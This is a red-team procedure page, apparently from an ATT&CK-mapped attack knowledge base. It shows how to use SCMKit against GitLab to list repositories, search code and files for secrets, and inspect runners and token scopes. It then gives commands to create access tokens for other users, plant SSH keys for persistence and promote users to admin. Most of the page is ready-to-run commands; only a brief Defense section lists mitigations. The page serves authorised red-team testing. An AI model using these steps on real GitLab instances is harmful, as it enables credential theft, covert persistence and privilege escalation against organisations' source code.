---
id: fbbe2a7f-290d-46ed-bde0-4026d913b542
name: GitLab-Repository-Enumeration-and-Search
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:25.155487+00:00'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Discovery|TA0007 - Discovery]]'
techniques:
  - '[[techniques/Account Discovery|T1087 - Account Discovery]]'
  - >-
    [[techniques/Exploitation for Credential Access|T1212 - Exploitation for
    Credential Access]]
  - >-
    [[techniques/File and Directory Discovery|T1083 - File and Directory
    Discovery]]
sub_techniques: []
tags:
  - '[[tags/Enumerate repositories files and secrets]]'
  - '[[tags/Source Code Management & CI/CD Compromise]]'
commands:
  - '[[commands/scmkit-list-gitlab-repositories-api-key]]'
  - '[[commands/scmkit-list-gitlab-repositories-username-password]]'
  - '[[commands/scmkit-search-gitlab-repositories-api-key]]'
  - '[[commands/scmkit-search-github-repositories-username-password]]'
  - '[[commands/scmkit-search-github-code-api-key]]'
  - '[[commands/scmkit-search-github-code-username-password]]'
  - '[[commands/scmkit-search-gitlab-files-api-key]]'
  - '[[commands/scmkit-search-gitlab-files-username-password]]'
  - '[[commands/scmkit-list-gitlab-snippets-api-key]]'
  - '[[commands/scmkit-list-gitlab-snippets-username-password]]'
  - '[[commands/scmkit-list-gitlab-runners-api-key]]'
  - '[[commands/scmkit-list-gitlab-runners-username-password]]'
  - '[[commands/scmkit-get-gitlab-token-privileges-api-key]]'
  - '[[commands/scmkit-add-gitlab-admin-api-key]]'
  - '[[commands/scmkit-add-gitlab-admin-username-password]]'
  - '[[commands/scmkit-remove-gitlab-admin-username-password]]'
  - '[[commands/scmkit-create-gitlab-personal-access-token-api-key]]'
  - '[[commands/scmkit-create-gitlab-personal-access-token-username-password]]'
  - '[[commands/scmkit-list-gitlab-personal-access-tokens-api-key]]'
  - '[[commands/scmkit-list-gitlab-personal-access-tokens-username-password]]'
  - '[[commands/scmkit-remove-gitlab-personal-access-token-username-password]]'
  - '[[commands/scmkit-create-gitlab-ssh-key-api-token]]'
  - '[[commands/scmkit-create-gitlab-ssh-key-username-password]]'
  - '[[commands/scmkit-list-gitlab-ssh-keys-api-token]]'
  - '[[commands/scmkit-list-gitlab-ssh-keys-username-password]]'
  - '[[commands/scmkit-remove-gitlab-ssh-key-api-token]]'
  - '[[commands/scmkit-remove-gitlab-ssh-key-username-password]]'
platforms:
  - Linux
  - Windows
tools:
  - '[[tools/SCMKit]]'
validated: true
---

# GitLab-Repository-Enumeration-and-Search

## Summary

This procedure uses the SCMKit tool to enumerate GitLab repositories, search for specific content within them, list related resources like snippets and runners, and manage access controls such as personal access tokens and SSH keys. It enables attackers to discover sensitive information like credentials and secrets stored in repositories, supporting further actions like lateral movement or data exfiltration in a compromised GitLab environment.

## Description

In a GitLab instance, attackers with valid credentials or API keys can leverage APIs to systematically enumerate projects, search for repositories and files containing keywords, and inspect associated artifacts. This technique targets self-hosted or cloud-based GitLab deployments, assuming authenticated access. By listing repositories and searching content, sensitive data such as API keys, passwords, or configuration files can be identified. The procedure also covers administrative actions like adding users as admins or creating tokens, which can escalate privileges if initial access is at a low level. Expected outcomes include a comprehensive inventory of accessible resources and potential credential harvesting. Use this in red team engagements to simulate insider threats or post-compromise discovery in DevOps environments.

## Requirements

1. Valid GitLab credentials (username/password) or API key with appropriate scopes (e.g., read_api, read_repository).
2. SCMKit tool installed and executable.
3. Network access to the GitLab instance URL.
4. Basic knowledge of GitLab API permissions and SCMKit parameters.

## Defense

- Enforce least-privilege access to GitLab projects and APIs; use role-based access control (RBAC) to limit read access to sensitive repositories.
- Enable GitLab's audit logging and integrate with SIEM for monitoring API calls, especially enumeration and search patterns.
- Regularly scan repositories for secrets using tools like TruffleHog or GitLab's built-in secret detection.
- Rotate API keys and tokens frequently, and revoke unused ones; implement IP whitelisting for API access.

## Objectives

1. Enumerate and list accessible GitLab repositories to map the attack surface.
2. Search for sensitive files, code, or repositories containing keywords like 'password' or 'key'.
3. Manage and extract personal access tokens or SSH keys for persistence or escalation.
4. Identify runners and snippets for potential CI/CD compromise or code injection.

## Instructions

### Step 1: List GitLab Repositories Using Credentials

**Context**: Begin by enumerating all accessible repositories to understand the scope of available projects. This step uses either username/password or API key authentication to fetch a list of repositories.

**Command** ([[commands/scmkit-list-gitlab-repositories-username-password]]):
```bash
SCMKit.exe -s gitlab -m listrepo -c $_USERNAME:$_PASSWORD -u $_GITLAB_URL
```

> This command authenticates with username and password to list repositories. Replace placeholders with actual values. It returns a JSON array of project details including names, paths, and visibility.

**Command** ([[commands/scmkit-list-gitlab-repositories-api-key]]):
```bash
SCMKit.exe -s gitlab -m listrepo -c $_API_KEY -u $_GITLAB_URL
```

> Alternative authentication using an API key. Successful output includes repository metadata; errors indicate insufficient permissions.

**Expected Output**: A list of repositories in JSON format, e.g., {"projects": [{"id":1, "name":"project1", "path_with_namespace":"group/project1"}]}.

### Step 2: Search for Repositories by Keyword

**Context**: Narrow down repositories by searching for specific terms to quickly identify relevant projects containing sensitive content.

**Command** ([[commands/scmkit-search-gitlab-repositories-api-key]]):
```bash
SCMKit.exe -s gitlab -m searchrepo -c $_API_KEY -u $_GITLAB_URL -o $_SEARCH_TERM
```

> Searches GitLab repositories for the specified term. Useful for finding projects related to credentials or secrets.

**Command** ([[commands/scmkit-search-github-repositories-username-password]]):
```bash
SCMKit.exe -s github -m searchrepo -c $_USERNAME:$_PASSWORD -u $_GITHUB_URL -o $_SEARCH_TERM
```

> If cross-platform enumeration is needed, adapt for GitHub; output filters repositories matching the search.

**Expected Output**: Filtered list of matching repositories, e.g., matching project names or descriptions.

### Step 3: Search for Code or Files Containing Keywords

**Context**: After listing repositories, search within code or file names for sensitive patterns like API keys or passwords to extract secrets.

**Command** ([[commands/scmkit-search-github-code-api-key]]):
```bash
SCMKit.exe -s github -m searchcode -c $_API_KEY -u $_GITHUB_URL -o $_SEARCH_TERM
```

> Searches code content across repositories; adapt for GitLab if supported.

**Command** ([[commands/scmkit-search-github-code-username-password]]):
```bash
SCMKit.exe -s github -m searchcode -c $_USERNAME:$_PASSWORD -u $_GITHUB_URL -o $_SEARCH_TERM
```

> Username/password variant for code search.

**Command** ([[commands/scmkit-search-gitlab-files-api-key]]):
```bash
SCMKit.exe -s gitlab -m searchfile -c $_API_KEY -u $_GITLAB_URL -o $_SEARCH_TERM
```

> Searches file names in GitLab for the term.

**Command** ([[commands/scmkit-search-gitlab-files-username-password]]):
```bash
SCMKit.exe -s gitlab -m searchfile -c $_USERNAME:$_PASSWORD -u $_GITLAB_URL -o $_SEARCH_TERM
```

> File search with credentials.

**Expected Output**: Results showing file paths and repositories, e.g., {"files": [{"path": "config/secrets.txt", "repository": "project1"}]}.

### Step 4: List Snippets and Runners

**Context**: Enumerate user-owned snippets (short code shares) and CI/CD runners to identify potential injection points or misconfigurations.

**Command** ([[commands/scmkit-list-gitlab-snippets-api-key]]):
```bash
SCMKit.exe -s gitlab -m listsnippet -c $_API_KEY -u $_GITLAB_URL
```

**Command** ([[commands/scmkit-list-gitlab-snippets-username-password]]):
```bash
SCMKit.exe -s gitlab -m listsnippet -c $_USERNAME:$_PASSWORD -u $_GITLAB_URL
```

**Command** ([[commands/scmkit-list-gitlab-runners-api-key]]):
```bash
SCMKit.exe -s gitlab -m listrunner -c $_API_KEY -u $_GITLAB_URL
```

**Command** ([[commands/scmkit-list-gitlab-runners-username-password]]):
```bash
SCMKit.exe -s gitlab -m listrunner -c $_USERNAME:$_PASSWORD -u $_GITLAB_URL
```

> These commands list snippets and runners; check for exposed secrets in snippets or vulnerable runners.

**Expected Output**: JSON lists, e.g., for runners: {"runners": [{"id":1, "description":"shared-runner"}]}.

### Step 5: Check Token Privileges

**Context**: Verify the scopes and privileges of an existing API key to assess access level before further actions.

**Command** ([[commands/scmkit-get-gitlab-token-privileges-api-key]]):
```bash
SCMKit.exe -s gitlab -m privs -c $_API_KEY -u $_GITLAB_URL
```

> Retrieves privilege details for the token.

**Expected Output**: Privilege summary, e.g., {"scopes": ["api:read", "repository:write"]}.

### Step 6: Manage Personal Access Tokens

**Context**: Create, list, or remove tokens for persistence or escalation; if admin access, target other users.

**Command** ([[commands/scmkit-create-gitlab-personal-access-token-api-key]]):
```bash
SCMKit.exe -s gitlab -m createpat -c $_API_KEY -u $_GITLAB_URL -o $_TARGET_USERNAME
```

**Command** ([[commands/scmkit-create-gitlab-personal-access-token-username-password]]):
```bash
SCMKit.exe -s gitlab -m createpat -c $_USERNAME:$_PASSWORD -u $_GITLAB_URL -o $_TARGET_USERNAME
```

**Command** ([[commands/scmkit-list-gitlab-personal-access-tokens-api-key]]):
```bash
SCMKit.exe -s gitlab -m listpat -c $_API_KEY -u $_GITLAB_URL -o $_TARGET_USERNAME
```

**Command** ([[commands/scmkit-list-gitlab-personal-access-tokens-username-password]]):
```bash
SCMKit.exe -s gitlab -m listpat -c $_USERNAME:$_PASSWORD -u $_GITLAB_URL -o $_TARGET_USERNAME
```

**Command** ([[commands/scmkit-remove-gitlab-personal-access-token-username-password]]):
```bash
SCMKit.exe -s gitlab -m removepat -c $_USERNAME:$_PASSWORD -u $_GITLAB_URL -o $_PAT_ID
```

> Use to generate new tokens or revoke compromised ones.

**Expected Output**: For create: New token string; for list: Array of tokens with scopes.

### Step 7: Manage SSH Keys

**Context**: Add, list, or remove SSH keys for repository access, potentially enabling persistence via git operations.

**Command** ([[commands/scmkit-create-gitlab-ssh-key-api-token]]):
```bash
SCMKit.exe -s gitlab -m createsshkey -c $_API_TOKEN -u $_GITLAB_URL -o "$_SSH_PUBLIC_KEY"
```

**Command** ([[commands/scmkit-create-gitlab-ssh-key-username-password]]):
```bash
SCMKit.exe -s gitlab -m createsshkey -c $_USERNAME:$_PASSWORD -u $_GITLAB_URL -o "$_SSH_PUBLIC_KEY"
```

**Command** ([[commands/scmkit-list-gitlab-ssh-keys-api-token]]):
```bash
SCMKit.exe -s gitlab -m listsshkey -c $_API_TOKEN -u $_GITLAB_URL
```

**Command** ([[commands/scmkit-list-gitlab-ssh-keys-username-password]]):
```bash
SCMKit.exe -s gitlab -m listsshkey -c $_USERNAME:$_PASSWORD -u $_GITLAB_URL
```

**Command** ([[commands/scmkit-remove-gitlab-ssh-key-api-token]]):
```bash
SCMKit.exe -s gitlab -m removesshkey -c $_API_TOKEN -u $_GITLAB_URL -o $_SSH_KEY_ID
```

**Command** ([[commands/scmkit-remove-gitlab-ssh-key-username-password]]):
```bash
SCMKit.exe -s gitlab -m removesshkey -c $_USERNAME:$_PASSWORD -u $_GITLAB_URL -o $_SSH_KEY_ID
```

**Expected Output**: Confirmation messages, e.g., {"message": "SSH key added"}.

### Step 8: Manage Admin Privileges

**Context**: If elevated access is obtained, add or remove admin roles for privilege escalation across the GitLab instance.

**Command** ([[commands/scmkit-add-gitlab-admin-api-key]]):
```bash
SCMKit.exe -s gitlab -m addadmin -c $_API_KEY -u $_GITLAB_URL -o $_TARGET_USERNAME
```

**Command** ([[commands/scmkit-add-gitlab-admin-username-password]]):
```bash
SCMKit.exe -s gitlab -m addadmin -c $_USERNAME:$_PASSWORD -u $_GITLAB_URL -o $_TARGET_USERNAME
```

**Command** ([[commands/scmkit-remove-gitlab-admin-username-password]]):
```bash
SCMKit.exe -s gitlab -m removeadmin -c $_USERNAME:$_PASSWORD -u $_GITLAB_URL -o $_TARGET_USERNAME
```

> Promotes or demotes users to admin; requires existing admin privileges.

**Expected Output**: Status update, e.g., {"message": "User promoted to admin"}.
